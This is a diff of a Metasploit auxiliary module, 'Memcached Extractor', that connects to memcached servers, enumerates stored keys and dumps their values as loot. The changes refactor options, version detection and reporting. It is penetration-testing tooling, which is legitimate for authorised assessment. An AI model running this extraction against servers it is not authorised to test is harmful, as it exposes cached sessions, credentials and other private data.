@@ -11,21 +11,32 @@ class Metasploit3 < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
+    super(update_info(
+      info,
       'Name'          => 'Memcached Extractor',
       'Description'   => %q(
         This module extracts the slabs from a memcached instance.  It then
         finds the keys and values stored in those slabs.
       ),
       'Author'        => [ 'Paul Deardorff <paul_deardorff[at]rapid7.com>' ],
-      'License'       => MSF_LICENSE
+      'License'       => MSF_LICENSE,
+      'References'     =>
+        [
+          ['URL', 'https://github.com/memcached/memcached/blob/master/doc/protocol.txt']
+        ]
     ))
 
     register_options(
       [
-        Opt::RPORT(11211),
-        OptInt.new('MAXKEYS', [ true, 'Maximum number of keys to be pulled from a slab', 100] )
-      ], self.class)
+        Opt::RPORT(11211)
+      ], self.class
+    )
+
+    register_advanced_options(
+      [
+        OptInt.new('MAXKEYS', [true, 'Maximum number of keys to be pulled from a slab', 100])
+      ], self.class
+    )
   end
 
   def max_keys
@@ -80,19 +91,35 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def determine_version
-    sock.send("stats\r\n", 0)
+    sock.send("version\r\n", 0)
     stats = sock.recv(4096)
-    matches = /^STAT (?<version>version (\.|\d)*)/.match(stats)
-    matches[:version] || 'unkown version'
+    if /^VERSION (?<version>[\d\.]+)/ =~ stats
+      version
+    else
+      nil
+    end
   end
 
   def run_host(ip)
-    print_status("#{ip}:#{rport} - Connecting to memcached server...")
+    peer = "#{ip}:#{rport}"
+    vprint_status("#{peer} - Connecting to memcached server...")
     begin
       connect
-      print_good("Connected to memcached #{determine_version}")
+      if (version = determine_version)
+        vprint_good("#{peer} - Connected to memcached version #{version}")
+        report_service(
+          host: ip,
+          name: 'memcached',
+          port: rport,
+          proto: 'tcp',
+          info: version
+        )
+      else
+        print_error("#{peer} - unable to determine memcached protocol version")
+        return
+      end
       keys = enumerate_keys
-      print_good("Found #{keys.size} keys")
+      print_good("#{peer} - Found #{keys.size} keys")
       return if keys.size == 0
 
       data = data_for_keys(keys)
@@ -106,11 +133,11 @@ class Metasploit3 < Msf::Auxiliary
         print_line
         print_line("#{result_table}")
       else
-        store_loot('memcached.dump', 'text/plain', ip, data, 'memcached.txt', 'Memcached extractor')
-        print_good("Loot stored!")
+        path = store_loot('memcached.dump', 'text/plain', ip, data, 'memcached.txt', 'Memcached extractor')
+        print_good("#{peer} - memcached loot stored as #{path}")
       end
     rescue Rex::ConnectionRefused, Rex::ConnectionTimeout
-      print_error("Could not connect to memcached server!")
+      vprint_error("#{peer} - Could not connect to memcached server!")
     end
   end
 end
